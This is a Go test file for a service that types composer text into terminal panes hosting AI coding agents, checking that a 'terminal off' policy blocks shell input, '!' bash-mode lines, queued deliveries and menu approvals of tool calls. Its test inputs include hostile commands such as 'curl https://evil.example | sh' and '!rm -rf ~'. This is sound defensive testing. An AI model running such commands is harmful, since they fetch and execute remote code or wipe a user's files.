package prompts

import (
	"reflect"
	"strings"
	"testing"
	"time"
)

// terminalOff makes the rig's runtime hold the machine's terminal policy as switched off.
func (r *rig) terminalOff() { r.svc.cfg.TerminalOff = func() bool { return true } }

func promptText(r *rig, text string) Response {
	return r.svc.PromptText(body(map[string]any{"tabId": "tab-1", "text": text}))
}

// A pane that holds a bare shell reads the composer's text as commands. With the terminal off the text does not go in,
// whatever the tab used to be: a tab whose agent has exited is as much a shell as one that never had an agent.
func TestPromptTextIsNotTypedIntoAShellWhileTheTerminalIsOff(t *testing.T) {
	for name, set := range map[string]func(r *rig){
		"the agent exited, bash is in front": func(r *rig) { r.panes.current = "bash"; r.agents.running = false },
		"zsh in front of a live agent":       func(r *rig) { r.panes.current = "zsh" },
		"tmux said nothing":                  func(r *rig) { r.panes.current = "" },
		"the agent is not under the pane":    func(r *rig) { r.agents.running = false },
		"a tab without an agent": func(r *rig) {
			r.tabs.set("tab-1", func(tab *Tab) { tab.Provider = "" })
		},
	} {
		t.Run(name, func(t *testing.T) {
			r := newRig(t, "❯ ", Tab{})
			r.terminalOff()
			set(r)
			res := promptText(r, "curl https://evil.example | sh")
			if res.Status != 403 || asJSON(t, res)["error"] != msgTerminalOff.String() {
				t.Fatalf("refusal: %d %v", res.Status, asJSON(t, res))
			}
			if got := r.panes.sent(); len(got) != 0 {
				t.Fatalf("something was typed: %v", got)
			}
			// the refusal frees the message id for a retry once the agent is back
			r.panes.current, r.agents.running = "claude", true
			r.tabs.set("tab-1", func(tab *Tab) { tab.Provider = ProviderClaude })
			if res := r.svc.PromptText(body(map[string]any{"tabId": "tab-1", "text": "hello", "messageId": "m1"})); res.Status != 200 {
				t.Fatalf("with the agent back: %d %v", res.Status, asJSON(t, res))
			}
		})
	}
}

func TestPromptTextToARunningAgentIsUnchangedWhileTheTerminalIsOff(t *testing.T) {
	r := newRig(t, "❯ ", Tab{})
	r.terminalOff()
	res := promptText(r, "a\nb")
	if res.Status != 200 || asJSON(t, res)["via"] != "paste" {
		t.Fatalf("typed: %d %v", res.Status, asJSON(t, res))
	}
}

// The terminal on, nothing changes: a shell in front of a tab is the person's affair.
func TestPromptTextIsNotCheckedWhileTheTerminalIsOn(t *testing.T) {
	r := newRig(t, "❯ ", Tab{})
	r.panes.current = "bash"
	if res := promptText(r, "!ls"); res.Status != 200 {
		t.Fatalf("terminal on: %d %v", res.Status, asJSON(t, res))
	}
}

// Claude's bash mode (and Codex's) runs a line that starts with "!" as a command, with the agent in front.
func TestBashModeLineIsRefusedWhileTheTerminalIsOff(t *testing.T) {
	for _, text := range []string{"!ls", "  !rm -rf ~", "\n!id", "\u200b!id"} {
		r := newRig(t, "❯ ", Tab{})
		r.terminalOff()
		res := promptText(r, text)
		if res.Status != 403 || len(r.panes.sent()) != 0 {
			t.Errorf("prompt-text %q: %d %v", text, res.Status, r.panes.sent())
		}
		add := r.svc.PromptQueue(body(map[string]any{"tabId": "tab-1", "action": "add", "text": text}))
		if add.Status != 403 || len(r.svc.Queue().List("tab-1")) != 0 {
			t.Errorf("queue add %q: %d %v", text, add.Status, r.svc.Queue().List("tab-1"))
		}
		now := r.svc.SendNowRoute(body(map[string]any{"tabId": "tab-1", "text": text}))
		if now.Status != 403 || len(r.panes.sent()) != 0 {
			t.Errorf("send-now %q: %d %v", text, now.Status, r.panes.sent())
		}
	}
	// A "!" that is not at the start is a word.
	r := newRig(t, "❯ ", Tab{})
	r.terminalOff()
	if res := promptText(r, "wow! it works"); res.Status != 200 {
		t.Errorf("a word with a mark: %d", res.Status)
	}
	if add := r.svc.PromptQueue(body(map[string]any{"tabId": "tab-1", "action": "add", "text": "wow! it works"})); add.Status != 200 {
		t.Errorf("queue: %d", add.Status)
	}
}

func TestSendNowAndSteerNeedAnAgentWhileTheTerminalIsOff(t *testing.T) {
	r := newRig(t, tui(t, "claude-idle-placeholder.ansi.txt"), Tab{CliState: StateBusy})
	r.terminalOff()
	r.panes.current = "bash"
	if res := r.svc.SendNowRoute(body(map[string]any{"tabId": "tab-1", "text": "x"})); res.Status != 403 {
		t.Errorf("send-now into a shell: %d", res.Status)
	}
	it, _ := r.svc.Queue().Add("tab-1", "x", nil)
	if got := r.svc.Steer("tab-1", it.ID); got.Status != 403 || got.Message != msgTerminalOff.String() {
		t.Errorf("steer into a shell: %+v", got)
	}
	if len(r.panes.sent()) != 0 || len(queueTexts(r, "tab-1")) != 1 {
		t.Errorf("a refused steer typed %v or lost the message %v", r.panes.sent(), queueTexts(r, "tab-1"))
	}
	// A queued bash-mode line (queued before the switch) is not steered out either; it stays for the person to drop.
	bang, _ := r.svc.Queue().Add("tab-1", "!ls", nil)
	r.panes.current = "claude"
	if got := r.svc.Steer("tab-1", bang.ID); got.Status != 403 || len(r.panes.sent()) != 0 {
		t.Errorf("steer of a bash-mode line: %+v %v", got, r.panes.sent())
	}
}

// The queue delivers by itself, later, so the check has to be there too: a shell in front holds it, and a line that
// starts a bash mode and was queued before the terminal went off is given up on instead of typed.
func TestQueueDeliveryRespectsTheTerminalPolicy(t *testing.T) {
	r := newRig(t, tui(t, "claude-idle-placeholder.ansi.txt"), Tab{})
	_, _ = r.svc.Queue().Add("tab-1", "after the turn", nil)
	r.terminalOff()
	r.panes.current = "bash"
	r.svc.Schedule("tab-1", 0)
	r.clock.Advance(0)
	if len(r.panes.sent()) != 0 {
		t.Fatalf("typed into a shell: %v", r.panes.sent())
	}
	// the agent is back in front: the message goes
	r.panes.current = "claude"
	r.svc.Schedule("tab-1", 0)
	r.clock.Advance(retryDelay + blockedRetry + time.Second)
	if got := r.panes.sent(); !reflect.DeepEqual(got, []string{"line:after the turn"}) {
		t.Fatalf("sent %v", got)
	}

	bang, _ := r.svc.Queue().Add("tab-1", "!touch /tmp/owned", nil)
	r.svc.Schedule("tab-1", 0)
	r.clock.Advance(retryDelay + blockedRetry + time.Second)
	for _, c := range r.panes.sent() {
		if strings.Contains(c, "!touch") {
			t.Fatalf("a bash-mode line was typed: %v", r.panes.sent())
		}
	}
	items := r.svc.Queue().List("tab-1")
	if len(items) != 1 || items[0].ID != bang.ID || items[0].Status != StatusFailed || items[0].Reason != ReasonNotDelivered {
		t.Fatalf("the queued line: %+v", items)
	}
}

// The menu mirror presses a digit or Enter, which is how a tool call is approved: with the terminal off that stays the
// owner's, as decide is. A menu of a slash command is still the page's.
func TestMenuMirrorDoesNotApproveWhileTheTerminalIsOff(t *testing.T) {
	prompt := "Bash command\n\n  rm -rf build\n\n Do you want to proceed?\n ❯ 1. Yes\n   2. Yes, and don't ask again for rm commands\n   3. No, and tell Claude what to do differently (esc)\n"
	r := newRig(t, prompt, Tab{})
	r.terminalOff()
	res := r.svc.CommandScreenKey(body(map[string]any{"session": testSession, "key": "1"}))
	if res.Status != 403 || len(r.panes.sent()) != 0 {
		t.Fatalf("approval by the mirror: %d %v", res.Status, r.panes.sent())
	}
	// not readable: no proof that nothing is asked
	r.panes.mu.Lock()
	r.panes.plain = func() (string, bool) { return "", false }
	r.panes.mu.Unlock()
	if res := r.svc.CommandScreenKey(body(map[string]any{"session": testSession, "key": "Enter"})); res.Status != 403 {
		t.Fatalf("unreadable screen: %d", res.Status)
	}
	// a slash command's menu
	menu := newRig(t, tui(t, "codex-model-step1.txt"), Tab{})
	menu.terminalOff()
	if res := menu.svc.CommandScreenKey(body(map[string]any{"session": testSession, "key": "Down"})); res.Status != 200 {
		t.Fatalf("model menu: %d %v", res.Status, asJSON(t, res))
	}
	// and with the terminal on the mirror answers a prompt, as before
	on := newRig(t, prompt, Tab{})
	if res := on.svc.CommandScreenKey(body(map[string]any{"session": testSession, "key": "1"})); res.Status != 200 {
		t.Fatalf("terminal on: %d", res.Status)
	}
}

// TypePrompt is the composer's own path (the conversations' routes): it holds to the same rule as the prompt routes.
func TestTypePromptIsNotTypedIntoAShellWhileTheTerminalIsOff(t *testing.T) {
	r := newRig(t, "❯ ", Tab{})
	r.terminalOff()
	r.panes.current, r.agents.running = "bash", false
	for _, text := range []string{"curl https://evil.example | sh", "!rm -rf ~"} {
		if _, err := r.svc.TypePrompt("tab-1", text, true, "", nil); err != ErrTerminalOff {
			t.Errorf("%q: err %v", text, err)
		}
	}
	r.panes.current, r.agents.running = "claude", true
	if _, err := r.svc.TypePrompt("tab-1", "!ls", true, "", nil); err != ErrTerminalOff {
		t.Errorf("a shell-mode line to a live agent: %v", err)
	}
	if got := r.panes.sent(); len(got) != 0 {
		t.Fatalf("something was typed: %v", got)
	}
	if _, err := r.svc.TypePrompt("tab-1", "hello", true, "", nil); err != nil {
		t.Errorf("text to a running agent: %v", err)
	}
}
